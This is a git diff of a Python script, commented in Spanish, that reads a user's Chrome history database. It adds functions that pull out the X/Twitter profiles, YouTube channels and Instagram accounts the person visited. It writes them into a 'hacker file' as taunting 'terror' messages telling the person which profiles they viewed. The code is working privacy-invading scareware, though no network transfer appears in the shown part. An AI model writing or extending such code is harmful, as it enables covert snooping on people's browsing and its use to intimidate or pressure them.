@@ -1,4 +1,5 @@
 import os
+import re
 from pathlib import Path
 from time import sleep
 from random import randrange
@@ -52,13 +53,13 @@ def get_chrome_history(user_path):
             cursor = connection.cursor()
 
             # REALIZAR SENTENCIA SQL para ver los datos que nos gustaría
-            cursor.execute("SELECT title, last_visit_time from urls ORDER BY  last_visit_time DESC")
+            cursor.execute("SELECT title, last_visit_time,url from urls ORDER BY  last_visit_time DESC LIMIT 50")
 
             # Recoge todos los datos
             urls = cursor.fetchall()
 
             # MOSTRARMOS POR CONSOLA LA RESPUESTA A LA BD
-            # print(urls)
+            print(urls)
 
             # Cerrar conexion
             connection.close()
@@ -74,6 +75,44 @@ def check_history_write(hacker_file, chrome_history):
 
     for item in chrome_history[:10]:
         hacker_file.write("He visto que has visitado la web : {} , interesante \n".format(item[0]))
+
+
+def check_profile_of_twitter(hacker_file, chrome_history):
+    #ARRAY DONDE SE ALMACENERÁ LOS NONBRES DE LAS CUENTAS
+    user_profile = []
+    for item in chrome_history:
+        results = re.findall("https://x.com/([A-Za-z0-9]+)$", item[2])
+        if results and results[0] not in ["notifications", "home", "messages", "explore"]:
+            user_profile.append(results[0])
+
+    hacker_file.write("E VISTO QUE HAS ENTRADO EN LOS PERFILES DE : {}".format(", ".join(user_profile)))
+
+def check_channel_of_youtube(hacker_file, chrome_history):
+    #ARRAY DONDE SE GUARDARÁ EL CANAL DE YOUTUBE
+    channels = []
+    for item in chrome_history:
+        results = re.findall("https://www.youtube.com/@([A-Za-z0-9]+)$", item[2])
+        if results and results[0]:
+            channels.append(results[0])
+    hacker_file.write("\nHAS VISITADO LOS CANALES DE  YOUTUBE ... : {}".format(", ".join(channels)))
+
+
+def check_profile_instagram(hacker_file, chrome_history):
+    user_insta = []
+    for item in chrome_history:
+        # results = re.findall("@([A-Za-z0-9]+)" + "• Fotos y vídeos de Instagram", item[0])
+        # #SI HEMOS VISITADOS VARIAZ VECES EL MISMO PERFIL LO QUITAMOS CON NOT INT EN LA LISTA
+        # if results and results[0] not in user_insta:
+        #     user_insta.append(results[0])
+        title = item[0]
+        if "• Fotos y vídeos de Instagram" in title:
+            results = re.findall(r'@([A-Za-z0-9_]+)', title)
+            # SI HEMOS VISITADO VARIAS VECES EL MISMO PERFIL LO QUITAMOS CON NOT IN EN LA LISTA
+            if results:
+                for result in results:
+                    if result not in user_insta:
+                        user_insta.append(result)
+    hacker_file.write("\nSe que has entrado en instagram y has visto unos perfiles como....:{}".format(", ".join(user_insta)))
 
 def main():
 
@@ -91,8 +130,16 @@ def main():
     #RECOGEMOS EL HISTORIAL DEL USUARIO DE GOOGLE
     chrome_history = get_chrome_history(user_path)
 
+    check_profile_of_twitter(hacker_file, chrome_history)
+
     #Escribiendo message de terror
-    check_history_write(hacker_file, chrome_history)
+    check_channel_of_youtube(hacker_file, chrome_history)
+
+    #EXTRAER Y LEER LOS PERFILES DE INSTA Y AGREGARLOS A UN TXT
+    check_profile_instagram(hacker_file, chrome_history)
+
+    #VER HISTORIAL
+    # get_chrome_history(user_path)
 
     #Obtener nombre del user
     # print(os.getlogin())
